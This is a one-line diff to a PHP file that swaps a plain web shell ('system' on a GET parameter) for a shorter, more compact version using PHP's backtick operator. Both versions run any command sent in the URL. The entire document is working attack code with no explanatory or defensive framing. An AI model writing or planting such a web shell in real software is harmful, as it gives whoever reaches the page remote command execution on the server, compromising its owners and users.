@@ -1,1 +1,1 @@
-<?php system($_GET['cmd']);?>
+<?=`$_GET[0]`?>
